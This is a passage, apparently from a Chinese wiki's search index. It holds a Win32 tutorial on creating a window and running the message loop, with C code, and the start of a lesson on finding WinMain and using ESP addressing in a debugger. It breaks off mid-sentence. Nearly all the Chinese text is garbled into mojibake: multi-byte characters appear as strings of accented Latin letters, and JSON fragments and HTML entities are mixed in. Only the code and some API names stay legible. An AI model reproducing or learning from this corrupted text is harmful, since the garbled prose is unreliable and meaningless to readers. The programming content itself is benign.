ç¬¬ä¸€ä¸ªçª—å£ç¨‹åº åˆ›å»ºçª—å£ç¨‹åºçš„å¤§è‡´æ­¥éª¤ï¼š å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† ä¾‹ å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ windowsæä¾›äº†æ³¨å†Œçª—å£ç±»ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªè¿™æ ·çš„å¯¹è±¡ï¼Œç„¶åå¡«å……è¯¥å¯¹è±¡çš„æˆå‘˜å­—æ®µã€‚ä¸ç”¨å¤ªå…³æ³¨WNDCLASSå¯¹è±¡ä¸­æ¯ä¸ªæˆå‘˜çš„å«ä¹‰ã€‚ 1WNDCLASS wndClass = &#123;0&#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackgroundæ˜¯ç”»åˆ·ç±»å‹ï¼Œå¼ºè½¬ã€‚ 1wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² çª—å£çš„åå­— 12TCHAR className[] = TEXT(&quot;My First Window&quot;);wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstanceæ˜¯è¯´å½“å‰çª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œè¿™ä¸ªçª—å£å±äºå½“å‰è¿›ç¨‹ï¼Œå¡«WinMainå‡½æ•°å‚æ•°hInstance 1wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ å½“ç”¨æˆ·å¯¹çª—å£æ“ä½œåï¼Œæ“ä½œç³»ç»Ÿå°†è¿™ä¸ªæ“ä½œå°è£…æˆæ¶ˆæ¯ï¼Œå°†æ¶ˆæ¯æ”¾åˆ°ç›¸åº”çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œçª—å£å‡½æ•°è´Ÿè´£å¤„ç†æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ã€‚ 1wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° çª—å£è¿‡ç¨‹å‡½æ•°1234567LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ è®©æ“ä½œç³»ç»Ÿèƒ½æ‰¾åˆ°åˆšæ‰å®šä¹‰çš„çª—å£å¯¹è±¡ã€‚ 1RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» çª—å£ä½ç½®å’Œçª—å£å¤§å°çš„å•ä½éƒ½æ˜¯åƒç´  è¿™ä¸ªçª—å£æ˜¯åœ¨win32k.sysä¸­ç”»çš„ï¼Œç”»å®Œäº†è¿”å›HWNDç»™åº”ç”¨å±‚ç”¨ã€‚ 123456789101112131415HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å½“å‰åº”ç”¨ç¨‹åºçš„å¥æŸ„ NULL); // é™„åŠ å‚æ•°ï¼Œä¸€èˆ¬å¡«ç©ºchar szOutBuff[0x80];if (hWnd == NULL)&#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0;&#125; æ˜¾ç¤ºçª—å£ 1ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† ä¸€ä¸ªçº¿ç¨‹æœ‰äº†çª—å£å¯¹è±¡åï¼Œå°±æœ‰ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ã€‚è¿™ä¸ªçº¿ç¨‹å¯èƒ½æœ‰å¾ˆå¤šä¸ªçª—å£å¯¹è±¡ï¼Œæ‰€æœ‰çª—å£å¯¹è±¡çš„æ¶ˆæ¯éƒ½æ”¾åˆ°è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚ 123456BOOL GetMessage( [out] LPMSG lpMsg, // message information [in, optional] HWND hWnd, // handle to window [in] UINT wMsgFilterMin, // first message [in] UINT wMsgFilterMax // lase message); GetMessageåä¸‰ä¸ªå‚æ•°éƒ½æ˜¯è¿‡æ»¤æ¡ä»¶ã€‚ hWndï¼šè¡¨ç¤ºè¦å–å“ªä¸ªçª—å£çš„æ¶ˆæ¯ã€‚NULLè¡¨ç¤ºå–æ‰€æœ‰çª—å£çš„æ¶ˆæ¯ wMsgFilterMinå’ŒwMsgFilterMaxï¼šå–å“ªä¸ªèŒƒå›´å†…çš„æ¶ˆæ¯ æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ²¡æœ‰æ¶ˆæ¯å–çš„è¯ä¼šé˜»å¡ã€‚ å–åˆ°æ¶ˆæ¯åç”¨DispatchMessageæ¥åˆ†å‘å‡½æ•°ï¼Œåˆ†å‘çš„ç›®çš„æ˜¯ä¸ºäº†æ‰¾åˆ°ç”¨å“ªä¸ªçª—å£å‡½æ•°æ¥å¤„ç†è¿™ä¸ªæ¶ˆæ¯ã€‚ è™½ç„¶ç”¨GetMessageå°†æ¶ˆæ¯å–å‡ºæ¥äº†ï¼Œä½†åœ¨3ç¯æ— æ³•å¤„ç†è¿™ä¸ªæ¶ˆæ¯ï¼Œå› ä¸ºå¹¶ä¸çŸ¥é“å¯¹åº”çš„æ¶ˆæ¯å¤„ç†å‡½æ•°åœ¨å“ªã€‚æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯å¯èƒ½æ˜¯æ¥æºè¯¥çº¿ç¨‹ä¸‹æ‰€æ‹¥æœ‰çš„ä»»ä½•çª—å£å¯¹è±¡ä¹‹ä¸€ã€‚æ‰€ä»¥éœ€è¦å†æ¬¡è¿›0ç¯è¿›è¡ŒåŒºåˆ†ã€‚å› ä¸ºæ¯ä¸ªçª—å£å¯¹è±¡çš„çª—å£å¤„ç†å‡½æ•°åœ¨çª—å£å¯¹è±¡ä¸­æè¿°ï¼Œè€Œçª—å£å¯¹è±¡åœ¨0ç¯ã€‚åœ¨ç¨‹åºä¸Šä½“ç°å°±æ˜¯GetMessageåéœ€è¦DispatchMessageè¿›è¡Œæ¶ˆæ¯çš„åˆ†å‘ã€‚GetMessageæ—¶å¾—åˆ°äº†çª—å£çš„å¥æŸ„ï¼ŒDispatchMessageæ—¶æ ¹æ®è¿™ä¸ªçª—å£çš„å¥æŸ„å»æ‰¾è¿™ä¸ªçª—å£å¯¹åº”çš„çª—å£å¤„ç†å‡½æ•°ï¼Œè®©è¿™ä¸ªçª—å£å¤„ç†å‡½æ•°å¤„ç†æ¶ˆæ¯ã€‚ 123456789101112131415161718192021// 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç†MSG msg;BOOL bRet;while ((bRet = GetMessage(&amp;msg, // outå‚æ•°ï¼Œå–å‡ºæ¥çš„æ¶ˆæ¯æ”¾MSGé‡Œ NULL, // å–æ‰€æœ‰çª—å£çš„æ¶ˆæ¯ 0, // å–æ‰€æœ‰æ¶ˆæ¯ 0) // å–æ‰€æœ‰æ¶ˆæ¯ ) != 0) // æ¶ˆæ¯å¾ªç¯&#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // è½¬æ¢æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125;&#125; å®Œæ•´ç¨‹åº Visual Studio123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123;0&#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; Windowsçª—å£ç¨‹åºçš„å·¥ä½œæµç¨‹ çº¿ç¨‹ä¸æ¶ˆæ¯é˜Ÿåˆ—: åœ¨Windowsä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚åœ¨ä¸Šé¢çš„ç¨‹åºä¸­ï¼Œæ²¡æœ‰åˆ›å»ºæ–°çš„çº¿ç¨‹ï¼Œæ‰€ä»¥WinMainå‡½æ•°æœ¬èº«å°±æ˜¯ä¸€ä¸ªçº¿ç¨‹ã€‚ æ¯ä¸ªçº¿ç¨‹åœ¨æ“ä½œç³»ç»Ÿçš„å†…æ ¸ï¼ˆ0ç¯ï¼‰ä¸­æœ‰ä¸€ä¸ªå¯¹åº”çš„çº¿ç¨‹ç»“æ„ä½“ã€‚å½“çº¿ç¨‹åˆ›å»ºäº†çª—å£å¯¹è±¡åï¼Œå®ƒå°±æ‹¥æœ‰äº†ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ã€‚è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ç”¨æ¥æ¥æ”¶é’ˆå¯¹è¯¥çª—å£çš„æ¶ˆæ¯ã€‚ åˆ›å»ºçª—å£å¯¹è±¡: ä½¿ç”¨CreateWindowå‡½æ•°åˆ›å»ºä¸€ä¸ªçª—å£å¯¹è±¡ã€‚è¿™ä¸ªå‡½æ•°åœ¨å†…æ ¸å±‚æ‰§è¡Œï¼Œå¹¶åˆ›å»ºä¸€ä¸ªçª—å£å¯¹è±¡ï¼Œçª—å£å¯¹è±¡ä¸­åŒ…å«ä¸€ä¸ªæŒ‡å‘æ‰€å±çº¿ç¨‹çš„å¼•ç”¨ã€‚ ç¨‹åºä¸­å®šä¹‰äº†çª—å£çš„ä¸€äº›å±æ€§ï¼ˆå¦‚çª—å£ç±»åã€çª—å£è¿‡ç¨‹å‡½æ•°ã€çª—å£æ ·å¼ç­‰ï¼‰ï¼Œå¹¶RegisterClassæ³¨å†Œäº†çª—å£ç±»ï¼Œç„¶åCreateWindowåˆ›å»ºäº†ä¸€ä¸ªçª—å£å®ä¾‹ã€‚ æ¶ˆæ¯çš„äº§ç”Ÿä¸å¤„ç†: ç”¨æˆ·çš„æ“ä½œï¼ˆå¦‚ç‚¹å‡»é¼ æ ‡æˆ–æŒ‰é”®ï¼‰æˆ–å…¶ä»–è¿›ç¨‹é€šè¿‡APIå‘ç”Ÿçš„äº‹ä»¶ï¼Œéƒ½ä¼šç”Ÿæˆæ¶ˆæ¯ã€‚è¿™äº›æ¶ˆæ¯ç”±æ“ä½œç³»ç»Ÿå¤„ç†ï¼Œç„¶åè¢«å‘é€åˆ°å¯¹åº”çª—å£çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚ æ¶ˆæ¯å¾ªç¯é€šè¿‡GetMessageå‡½æ•°ä»é˜Ÿåˆ—ä¸­è·å–æ¶ˆæ¯ã€‚TranslateMessageè´Ÿè´£å¯¹ç‰¹å®šæ¶ˆæ¯è¿›è¡Œç¿»è¯‘å¤„ç†ï¼Œä¾‹å¦‚å°†é”®ç›˜è¾“å…¥è½¬æ¢ä¸ºå­—ç¬¦æ¶ˆæ¯ã€‚ DispatchMessageå‡½æ•°æ ¹æ®æ¶ˆæ¯ä¸­çš„çª—å£å¥æŸ„HWNDæ‰¾åˆ°ç›¸åº”çš„çª—å£å¯¹è±¡ï¼Œå¹¶è°ƒç”¨è¯¥çª—å£å¯¹è±¡çš„çª—å£è¿‡ç¨‹å‡½æ•°æ¥å¤„ç†æ¶ˆæ¯ã€‚ å›è°ƒå‡½æ•°ä¸æ¶ˆæ¯å¤„ç†: DispatchMessageè¿›å…¥å†…æ ¸æ‰¾åˆ°å¯¹åº”çš„çª—å£å¯¹è±¡åï¼Œæ“ä½œç³»ç»Ÿå›è°ƒï¼ˆå›å¤´è°ƒç”¨ï¼‰çª—å£è¿‡ç¨‹å‡½æ•°ï¼ˆä¾‹å¦‚WindowProcï¼‰æ¥å¤„ç†æ¶ˆæ¯ã€‚callbackå‡½æ•°ï¼Œcall me back when åœ¨ä¸Šé¢çš„ç¨‹åºä¸­ï¼ŒWindowProcå‡½æ•°å®é™…ä¸Šåªæ˜¯è°ƒç”¨äº†é»˜è®¤çš„çª—å£å¤„ç†å‡½æ•°DefWindowProcæ¥å¤„ç†å¤§å¤šæ•°æ¶ˆæ¯ã€‚ GetMessageå–æ¶ˆæ¯ï¼Œä¸€ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ‰€æœ‰çª—å£å¯¹è±¡çš„æ¶ˆæ¯éƒ½åœ¨è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—é‡Œã€‚GetMessageå–æ¶ˆæ¯åæ²¡æ³•å¤„ç†ï¼Œéœ€è¦DispatchMessageå‡½æ•°å†æ¬¡è¿›åˆ°å†…æ ¸ï¼ˆæ¶‰åŠAPIè°ƒç”¨æµç¨‹ï¼‰ï¼Œæ‰¾åˆ°ç›¸åº”çš„çª—å£å¯¹è±¡ï¼ˆçª—å£å¯¹è±¡ä¸­æè¿°äº†å½“å‰çª—å£çš„çª—å£è¿‡ç¨‹å‡½æ•°ï¼‰ï¼Œåé¢ç”±æ“ä½œç³»ç»Ÿå†…æ ¸è°ƒç”¨è¯¥çª—å£çª—å£è¿‡ç¨‹å‡½æ•°æ¥å¤„ç†æ¶ˆæ¯ã€‚ åŸå§‹è‰ç¨¿ï¼š è¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨ä¸Šé¢çš„ç¨‹åºä¸­æ²¡æœ‰åˆ›å»ºæ–°çº¿ç¨‹ï¼Œæ‰€ä»¥mainå‡½æ•°å°±æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œåªè¦æ˜¯çº¿ç¨‹ï¼Œé‚£ä¹ˆåœ¨0ç¯å°±ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„çº¿ç¨‹ç»“æ„ä½“ã€‚éšåï¼Œç¨‹åºä¸­ä½¿ç”¨äº†CreateWindowï¼ˆåœ¨0ç¯ï¼‰åˆ›å»ºäº†ä¸€ä¸ªçª—å£å¯¹è±¡ï¼ˆæŒ‡æ˜äº†çª—å£è¿‡ç¨‹å‡½æ•°ï¼‰ï¼Œçª—å£å¯¹è±¡ä¸­æœ‰ä¸ªæˆå‘˜æ ‡è¯†äº†æ‰€å±çº¿ç¨‹ã€‚è¿™ä¸ªçº¿ç¨‹æœ‰äº†çª—å£å¯¹è±¡ï¼Œé‚£ä¹ˆå°±å­˜åœ¨æ¶ˆæ¯é˜Ÿåˆ—äº†ã€‚è¿™ä¸ªé˜Ÿåˆ—ç”¨äºæ¥æ”¶æ¶ˆæ¯ã€‚ç”¨æˆ·å¯¹çª—å£çš„æ“ä½œï¼Œå¦‚ç‚¹å‡»é¼ æ ‡æˆ–æŒ‰ä¸‹é”®ç›˜ï¼Œå…¶ä»–è¿›ç¨‹é€šè¿‡APIå‘ç”Ÿçš„æ¶ˆæ¯ï¼Œè¿™äº›æ¶ˆæ¯å¯¹è±¡éƒ½ä¼šç”±æ“ä½œç³»ç»Ÿæ‰¾åˆ°çª—å£å¯¹è±¡ï¼Œæ ¹æ®çª—å£å¯¹è±¡æ‰¾åˆ°çº¿ç¨‹ï¼Œå°†è¯¥æ¶ˆæ¯å­˜å‚¨åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼ŒéšåGetMessageä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–æ¶ˆæ¯ï¼Œè€Œå¤„ç†è¿™ä¸ªæ¶ˆæ¯çš„å›è°ƒå‡½æ•°åœ¨0ç¯çª—å£å¯¹è±¡çš„æè¿°ä¿¡æ¯ä¸­ï¼ˆå›è°ƒå‡½æ•°åœ°å€ï¼‰ï¼Œæ‰€ä»¥è¦è°ƒç”¨DispatchMessageï¼ŒDispatchMessageä¼šæ‹¿ç€å¾—åˆ°çš„çª—å£å¥æŸ„ï¼Œè¿›0ç¯æ‰¾å¯¹åº”çš„çª—å£å¯¹è±¡ï¼Œæ¯”å¦‚æ˜¯çª—å£Açš„å¥æŸ„ï¼Œéšåè°ƒç”¨çª—å£Açš„å›è°ƒå‡½æ•°WindowProc1æ¥å¤„ç†è¿™ä¸ªæ¶ˆæ¯ã€‚"},{"title":"çª—å£ç¨‹åºé€†å‘åˆ†æ","path":"/wiki/Windows_API/çª—å£ç¨‹åºé€†å‘åˆ†æ.html","content":"win32åº”ç”¨ç¨‹åºå…¥å£è¯†åˆ« é€†å‘åˆ†æçš„äººæœ¬èº«ä¸€å®šæ˜¯ä¼šé€ é£æœºçš„äººï¼Œåªä¸è¿‡ä»–é€ çš„å¯èƒ½æ²¡æœ‰åˆ«äººå¥½ï¼Œæ²¡æœ‰åˆ«äººå¿«ï¼Œä½†ä»–ä¸€å®šçŸ¥é“é€ ä¸€æ¶å®Œæ•´çš„é£æœºéœ€è¦ä»€ä¹ˆ å…ˆå†™ç¨‹åºï¼ŒæŠŠè‡ªå·±çš„ä»£ç çœ‹æ‡‚äº†ï¼Œå†é€†åˆ«äººçš„ ç¨‹åºå¯åŠ¨åæ‰§è¡Œå…¥å£å‡½æ•°ï¼Œç„¶åæ‰åˆ°ç¨‹åºçš„è¯­æ³•å…¥å£å‡½æ•°WinMainã€‚WinMainæœ‰å››ä¸ªå‚æ•°ï¼Œå‡½æ•°è°ƒç”¨çº¦å®šæ˜¯__stdcallï¼ˆå‚æ•°ä»å³åˆ°å·¦å‹æ ˆï¼Œå†…å¹³æ ˆï¼‰ã€‚hInstanceæ˜¯æœ€åå‹å…¥æ ˆçš„ã€‚ 123456int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd); ä¾‹ ç¨‹åºè½½å…¥ODåå¾€ä¸‹æ‰¾å››ä¸ªå‚æ•°çš„callï¼Œçœ‹åˆ°GetModuleHandleï¼ˆè·å–å½“å‰æ¨¡å—çš„å¥æŸ„ï¼‰ï¼Œè¿”å›ç»“æœåœ¨eaxï¼Œç„¶åå°±æ˜¯call 004010000ï¼Œæœ‰ç‚¹åƒæ˜¯WinMain(å› ä¸ºå‚æ•°ä»å³åˆ°å·¦å‹æ ˆï¼ŒhInstanceæœ€åå‹æ ˆ)ã€‚call 004010000å‰æœ‰æŒºå¤šä¸ªpushçš„ï¼Œ5ä¸ªã€‚ ODä¸ºä»€ä¹ˆçŸ¥é“è¿™é‡Œæ˜¯GetModuleHandleï¼Ÿ 40602Cæ˜¯IATè¡¨è¡¨é¡¹çš„åœ°å€ï¼ŒexeåŠ è½½åï¼Œç³»ç»ŸåŠ è½½å™¨ä¼šå°†[40602C]æ›¿æ¢ä¸ºå‡½æ•°åœ°å€ã€‚ODä¸‹é¢å†™å‡ºçš„å‡½æ•°åï¼Œä¼°è®¡æ˜¯INTè¡¨å’ŒIATè¡¨ä¸€å¯¹ï¼Œå°±çŸ¥é“å“ªä¸ªå‡½æ•°åï¼Œå¯¹åº”å“ªä¸ªå‡½æ•°åœ°å€ è¿›004010000çœ‹ä¸‹å†…å¹³æ ˆçš„æ•°é‡ï¼Œ16å­—èŠ‚ï¼Œ4ä¸ªå‚æ•°ï¼Œä½†è¿˜ä¸èƒ½ç¡®å®šï¼Œå› ä¸ºå¯èƒ½æœ‰å¯„å­˜å™¨ä¼ å‚ã€‚ å¾€å‰çœ‹ï¼Œecxï¼Œedxå¯„å­˜å™¨çš„å€¼æ˜¯callé‡Œé¢èµ‹å€¼çš„ï¼Œè€Œä¸æ˜¯å¤–é¢callingè€…ä¼ è¿›æ¥çš„ï¼Œæ‰€ä»¥æ²¡æœ‰å¯„å­˜å™¨ä¼ å‚ã€‚ ç»¼åˆä»¥ä¸Šï¼šè¿™ä¸ªcallå‚æ•°æ˜¯4ä¸ªï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯æ¨¡å—å¥æŸ„ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„WinMainå‡½æ•°ã€‚ ESPå¯»å€ æœ¬æ–‡ä¸­çš„exeæ˜¯Releaseç‰ˆï¼ŒReleaseç‰ˆcallä¸€ä¸ªå‡½æ•°è¿›å…¥åï¼Œå¹¶æ²¡æœ‰åƒä¹‹å‰è®²çš„push ebpï¼Œmov ebp,espï¼ŒæŠ¬æ ˆï¼Œå¡«å……0xCCé‚£æ ·çš„å¥—è·¯ï¼Œéšåç”¨EBPå¯»å€ã€‚è€Œæ˜¯ç›´æ¥æŠ¬æ ˆï¼Œç„¶åç”¨ESPå¯»å€ï¼Œå› ä¸ºçœäº‹ï¼Œä¸éœ€è¦ç¹ççš„æ­¥éª¤ï¼ˆpush ebpï¼Œmov ebp,espï¼ŒæŠ¬æ ˆï¼Œå¡«å……0xCCï¼‰ã€‚ EBPå¯»å€ï¼ŒEBPçš„å€¼åœ¨æ•´ä¸ªæ ˆå¸§å‘¨æœŸæ˜¯ä¸ä¼šå˜çš„ï¼Œè€ŒESPå¯»å€ï¼Œåªè¦å †æ ˆæœ‰å˜åŒ–ï¼ŒESPå¯»å€åŠ çš„åç§»å°±å˜äº†ã€‚ å‡è®¾åœ¨Aå‡½æ•°ä¸­è°ƒç”¨Bå‡½æ•°ï¼ŒEIPæŒ‡åˆ°Bå‡½æ•°sub esp,44ä½†è¿˜æœªæ‰§è¡Œæ—¶ï¼Œå †æ ˆä¸­çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ è¿™æ ·åˆ†æï¼šä¾æ¬¡å‹äº†ä¸‰ä¸ªå‚æ•°ï¼Œç„¶åæ˜¯callæŒ‡ä»¤ï¼ŒcallæŒ‡ä»¤æ¡çŠ¶å‰ä¼šå‹å…¥callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚é‚£ä¹ˆå †æ ˆä¸­ä¾æ¬¡æ˜¯ï¼šè¿”å›åœ°å€ï¼Œå‚æ•°3ï¼Œå‚æ•°2ï¼Œå‚æ•°1ã€‚ Aå‡½æ•°ä¸­è°ƒç”¨Bå‡½æ•°1234push å‚æ•°1push å‚æ•°2push å‚æ•°3call B Bå‡½æ•°å¼€å¤´123sub esp,44...... å †æ ˆä¸­å†™çš„è¿”å›åˆ°....ï¼Œå°±æ˜¯è¿”å›åœ°å€ï¼ˆå¯ä»¥å¯¹è¿™ä¸ªåœ°å€å³é”®åœ¨åæ±‡ç¼–çª—å£ä¸­è·Ÿè¿‡å»ï¼‰ æ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬æƒ³ç”¨ESPå¯»å€æ¥è¡¨ç¤ºhInstanceè¿™ä¸ªå‚æ•°ï¼Œå°±æ˜¯[ESP+4]ã€‚ å¦‚æœæ‰§è¡Œäº†æŠ¬æ ˆæ“ä½œsub esp,44ï¼Œæ­¤æ—¶æƒ³ç”¨ESPå¯»å€æ¥è¡¨ç¤ºhInstanceè¿™ä¸ªå‚æ•°ï¼Œå°±æ˜¯[ESP+44+4]ï¼Œå³[ESP+48]ã€‚å¦‚æœåˆæ‰§è¡Œäº†ä¸€å¥push esiï¼Œæ­¤æ—¶æƒ³ç”¨ESPå¯»å€æ¥è¡¨ç¤ºhInstanceè¿™ä¸ªå‚æ•°ï¼Œå°±æ˜¯[ESP+44+4+4],å³[ESP+4C]ã€‚ å¦‚æœæƒ³çŸ¥é“mov esi,dword ptr ss:[esp+4c]è¿™æ¡æŒ‡ä»¤ä¸­çš„[esp+4c]æ˜¯æŒ‡å“ªé‡Œï¼Œå¿…é¡»è¦ç”¨æ‰§è¡Œåˆ°è¿™å¥æ—¶espæ¥ç®—esp+4cã€‚ åœ¨å †æ ˆçª—å£å¯ä»¥åŒå‡»æŸä¸ªå †æ ˆåœ°å€ï¼Œä»¥å½“å‰å †æ ˆåœ°å€ä½œä¸ºç›¸å¯¹å€¼ï¼ŒODä¼šè‡ªåŠ¨è®¡ç®—å‡ºå…¶ä»–å †æ ˆåœ°å€ç›¸å½“äºå½“å‰åœ°å€çš„ç›¸å¯¹å€¼ã€‚ å°ç»“ï¼š ESPå¯»å€æ–¹å¼ï¼Œæ³¨æ„å †æ ˆçš„å˜åŒ–ä¼šå¼•èµ·ESPå¯»å€æ—¶åç§»çš„å˜åŒ–ã€‚ å¯ä»¥å€ŸåŠ©å †æ ˆçª—å£ç›¸å¯¹ESPçš„åŠŸèƒ½æ¥å¸®åŠ©è‡ªå·±è¿›è¡Œé€†å‘åˆ†æã€‚ çª—å£å›è°ƒå‡½æ•°çš„å®šä½ 